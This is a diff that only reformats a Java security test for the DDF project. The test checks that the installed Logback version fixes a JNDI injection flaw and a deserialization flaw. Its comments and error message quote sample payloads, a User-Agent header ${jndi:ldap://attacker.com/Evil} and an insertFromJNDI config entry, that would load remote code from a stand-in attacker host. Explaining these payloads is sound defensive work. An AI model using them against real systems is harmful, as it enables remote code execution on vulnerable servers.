@@ -36,6 +36,7 @@ import org.slf4j.LoggerFactory;
  * <p><b>Description:</b> Logback's DBAppender and JNDIConnectionSource components allow JNDI
  * lookups without proper validation, enabling remote code execution via JNDI injection attacks.
  * Similar to Log4Shell (CVE-2021-44228), attackers can:
+ *
  * <ul>
  *   <li>Execute arbitrary code by injecting JNDI LDAP/RMI URLs into log messages
  *   <li>Exploit via malicious input that gets logged (user agents, URLs, form fields)
@@ -44,10 +45,12 @@ import org.slf4j.LoggerFactory;
  * </ul>
  *
  * <p><b>Attack Example:</b>
+ *
  * <pre>
  * POST /catalog HTTP/1.1
  * User-Agent: ${jndi:ldap://attacker.com/Evil}
  * </pre>
+ *
  * When this User-Agent header is logged, Logback performs JNDI lookup and executes remote code.
  *
  * <p><b>Affected Versions:</b> Logback &lt; 1.2.9
@@ -61,6 +64,7 @@ import org.slf4j.LoggerFactory;
  * <p><b>Description:</b> Logback's configuration mechanism allows arbitrary Java object
  * deserialization when processing XML configuration files. If an attacker can modify the
  * logback.xml configuration file (via directory traversal, file upload, or local access):
+ *
  * <ul>
  *   <li>Arbitrary code execution via deserialization gadget chains
  *   <li>System compromise if configuration files are writable
@@ -69,6 +73,7 @@ import org.slf4j.LoggerFactory;
  * </ul>
  *
  * <p><b>Attack Scenario:</b>
+ *
  * <pre>
  * &lt;configuration&gt;
  *   &lt;insertFromJNDI env-entry-name="ldap://attacker.com/Evil" as="appName" /&gt;
@@ -82,6 +87,7 @@ import org.slf4j.LoggerFactory;
  * <p><b>DDF Impact:</b>
  *
  * <p>DDF uses Logback for all logging operations including:
+ *
  * <ul>
  *   <li>Application logging (INFO, DEBUG, WARN, ERROR levels)
  *   <li>Security audit logs (authentication, authorization, data access)
@@ -90,6 +96,7 @@ import org.slf4j.LoggerFactory;
  * </ul>
  *
  * <p>Without proper Logback version, DDF is vulnerable to:
+ *
  * <ul>
  *   <li>Remote code execution via JNDI injection in logged user input
  *   <li>Complete system compromise with no authentication required
@@ -100,6 +107,7 @@ import org.slf4j.LoggerFactory;
  * <p><b>Required Version:</b> Logback &gt;= 1.2.13 or &gt;= 1.4.14
  *
  * <p><b>References:</b>
+ *
  * <ul>
  *   <li>https://nvd.nist.gov/vuln/detail/CVE-2021-42550
  *   <li>https://nvd.nist.gov/vuln/detail/CVE-2023-6378
@@ -123,6 +131,7 @@ public class LogbackSecurityTest {
    * Test: Verify Logback version is secure (>= 1.2.13 or >= 1.4.14)
    *
    * <p>Validates that the Logback version addresses:
+   *
    * <ul>
    *   <li>CVE-2021-42550 (JNDI LDAP lookup vulnerability)
    *   <li>CVE-2023-6378 (Deserialization via configuration)
@@ -143,10 +152,7 @@ public class LogbackSecurityTest {
 
     // Parse version string (format: "1.2.3" or "1.2.3-SNAPSHOT")
     String[] parts = version.split("\\.");
-    assertThat(
-        "Logback version format should be X.Y.Z",
-        parts.length >= 3,
-        is(true));
+    assertThat("Logback version format should be X.Y.Z", parts.length >= 3, is(true));
 
     int majorVersion = Integer.parseInt(parts[0]);
     int minorVersion = Integer.parseInt(parts[1]);
@@ -172,8 +178,7 @@ public class LogbackSecurityTest {
         }
       } else if (minorVersion >= MINIMUM_MINOR_VERSION_1_4) {
         // Version 1.4.x or higher
-        if (minorVersion > MINIMUM_MINOR_VERSION_1_4
-            || patchVersion >= MINIMUM_PATCH_VERSION_1_4) {
+        if (minorVersion > MINIMUM_MINOR_VERSION_1_4 || patchVersion >= MINIMUM_PATCH_VERSION_1_4) {
           isVersionSecure = true;
         }
       } else if (minorVersion > MINIMUM_MINOR_VERSION_1_4) {
@@ -182,26 +187,27 @@ public class LogbackSecurityTest {
       }
     }
 
-    String errorMessage = String.format(
-        "Logback version %s is vulnerable to CVE-2021-42550 (JNDI) and CVE-2023-6378 (Deserialization). "
-            + "Minimum required version: 1.2.13 or 1.4.14\n\n"
-            + "CVE-2021-42550 (CVSS 9.8 CRITICAL):\n"
-            + "  JNDI LDAP lookup vulnerability allows remote code execution via injection in log messages.\n"
-            + "  Attack vector: ${jndi:ldap://attacker.com/Evil} in any logged user input\n"
-            + "  Fixed in Logback >= 1.2.9 (enhanced fixes in 1.2.13)\n\n"
-            + "CVE-2023-6378 (CVSS 7.5 HIGH):\n"
-            + "  Arbitrary object deserialization via malicious configuration files allows code execution.\n"
-            + "  Attack vector: Modified logback.xml with insertFromJNDI or receiver elements\n"
-            + "  Fixed in Logback >= 1.2.13, >= 1.3.14, >= 1.4.14\n\n"
-            + "DDF Impact:\n"
-            + "  - User input (search queries, headers, metadata) is logged and can trigger JNDI injection\n"
-            + "  - Configuration files may be writable via directory traversal vulnerabilities\n"
-            + "  - Complete system compromise with no authentication required\n\n"
-            + "References:\n"
-            + "  https://nvd.nist.gov/vuln/detail/CVE-2021-42550\n"
-            + "  https://nvd.nist.gov/vuln/detail/CVE-2023-6378\n"
-            + "  https://logback.qos.ch/news.html#1.2.13",
-        version);
+    String errorMessage =
+        String.format(
+            "Logback version %s is vulnerable to CVE-2021-42550 (JNDI) and CVE-2023-6378 (Deserialization). "
+                + "Minimum required version: 1.2.13 or 1.4.14\n\n"
+                + "CVE-2021-42550 (CVSS 9.8 CRITICAL):\n"
+                + "  JNDI LDAP lookup vulnerability allows remote code execution via injection in log messages.\n"
+                + "  Attack vector: ${jndi:ldap://attacker.com/Evil} in any logged user input\n"
+                + "  Fixed in Logback >= 1.2.9 (enhanced fixes in 1.2.13)\n\n"
+                + "CVE-2023-6378 (CVSS 7.5 HIGH):\n"
+                + "  Arbitrary object deserialization via malicious configuration files allows code execution.\n"
+                + "  Attack vector: Modified logback.xml with insertFromJNDI or receiver elements\n"
+                + "  Fixed in Logback >= 1.2.13, >= 1.3.14, >= 1.4.14\n\n"
+                + "DDF Impact:\n"
+                + "  - User input (search queries, headers, metadata) is logged and can trigger JNDI injection\n"
+                + "  - Configuration files may be writable via directory traversal vulnerabilities\n"
+                + "  - Complete system compromise with no authentication required\n\n"
+                + "References:\n"
+                + "  https://nvd.nist.gov/vuln/detail/CVE-2021-42550\n"
+                + "  https://nvd.nist.gov/vuln/detail/CVE-2023-6378\n"
+                + "  https://logback.qos.ch/news.html#1.2.13",
+            version);
 
     assertThat(errorMessage, isVersionSecure, is(true));
   }
@@ -293,9 +299,6 @@ public class LogbackSecurityTest {
     // In secure versions, JNDI substitution should be disabled by default
     // We can't directly test this without attempting a JNDI lookup (which would be dangerous),
     // but we verify the version is sufficient
-    assertThat(
-        "LoggerContext should be initialized",
-        loggerContext,
-        is(notNullValue()));
+    assertThat("LoggerContext should be initialized", loggerContext, is(notNullValue()));
   }
 }
